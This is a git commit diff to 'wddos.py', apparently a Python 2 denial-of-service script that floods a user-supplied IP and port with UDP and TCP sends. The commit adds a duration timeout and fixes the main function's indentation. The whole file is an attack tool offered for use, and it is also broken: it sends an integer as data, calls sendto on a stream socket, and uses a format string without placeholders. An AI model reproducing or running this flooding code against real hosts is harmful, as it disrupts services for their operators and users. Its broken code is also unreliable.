692fe96ac7379d4910e96443ff26618ffc586d27
MrSanZz <95021841+MrSanZz@users.noreply.github.com>
2023-10-09 20:38:22 +0700

    Update wddos.py

--- wddos.py
+++ wddos.py
@@ -5,20 +5,24 @@ import sys
 trgt = raw_input("IP : ")
 port = input("Port : ")
 
-def flood(trgt, port):
+def flood(trgt, port, duration):
     udp1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     udp2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     bytes = 6000000
+    timeout = time.time() + duration
     send = 500
 
     while 2:
-        pass
-        udp1.sendto(bytes, (trgt, port))
-        udp2.sendto(bytes, (trgt, port))
-        send = send + 2
-        print "Hacking Target With So Much Love :D"%(send, trgt, port)
-
-    def main():
-        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
-    if __name__ == '__main__':
-        main()
+        if time.time() > timeout:
+            break
+        else:
+            pass
+            udp1.sendto(bytes, (trgt, port))
+            udp2.sendto(bytes, (trgt, port))
+            send = send + 2
+            print "Hacking Target With So Much Love :D"%(send, trgt, port)
+            
+def main():
+    flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+if __name__ == '__main__':
+    main()
